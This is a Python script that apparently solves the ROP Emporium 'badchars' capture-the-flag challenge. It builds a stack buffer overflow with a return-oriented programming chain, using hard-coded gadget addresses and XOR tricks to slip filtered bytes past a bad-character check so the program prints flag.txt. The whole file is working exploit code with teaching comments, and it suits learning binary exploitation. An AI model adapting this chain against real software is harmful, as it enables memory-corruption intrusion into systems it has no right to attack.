import sys
import struct

# badchars are: 'x', 'g', 'a', '.'
# The string we want to write is flag.txt.. 
# those badchars are replaced with 0xeb by a function

# idea: write the string as is, then find other gadgets to modify it
# in memory. To do that, we can use a XOR gadget..


def p(a):
    return struct.pack("Q", a)

gadget1 = 0x000000000040069c #: pop r12; pop r13; pop r14; pop r15; ret;
gadget2 = 0x0000000000400634 #: mov qword ptr [r13], r12; ret; 
gadget3 = 0x00000000004006a3 #: pop rdi; ret;
gadget4 = 0x0000000000400628 #: xor byte ptr [r15], r14b; ret;
gadget5 = 0x00000000004006a0 #: pop r14; pop r15; ret; 
print_file = 0x0000000000400510

#   ||| |
# flag.txt
# 01234567
# we have to xor at position write_address + {2,3,4,6}

# the beginning of the data section is at x0000000000601028 
# but given that we are going to xor at  0x601028 + 6 = 0x60102e
# we are sending one of the badchars, which is 2e (ASCII dot '.')
# so the trick is only to write at a different address on that same page!

write_address = 0x0000000000601028 + 1 # .data section + 1

# the trick is to write badchar XOR 0xeb. Then we can use gadget4 to XOR again with 0xeb
# badchar XOR 0xeb XOR 0xeb = badchar.
eb = 0xeb
a = 0x61 ^ eb
g = 0x67 ^ eb
x = 0x78 ^ eb
dot = 0x2e ^ eb

# first send the string as is, then replace the 0xeb with the right chars
buf = b"A"*40
buf += p(gadget1)
buf += b"flag.txt" #pop r12
buf += p(write_address) # pop r13
buf += p(a) # pop r14
buf += p(write_address + 2) # pop r15, to later modify the third char
buf += p(gadget2) # perform the write of the string in memory
buf += p(gadget3) # prepare rdi to call print file
buf += p(write_address) # pop rdi
buf += p(gadget4) # obtain the 'a' in memory

# Go on XORing badchar one by one the remaining 'g' '.' and 'x' ..
buf += p(gadget5)
buf += p(g) 
buf += p(write_address + 3) 
buf += p(gadget4)

buf += p(gadget5)
buf += p(dot)
buf += p(write_address + 4) 
buf += p(gadget4)

buf += p(gadget5)
buf += p(x)
buf += p(write_address + 6) 
buf += p(gadget4)

buf += p(print_file)

sys.stdout.buffer.write(buf)
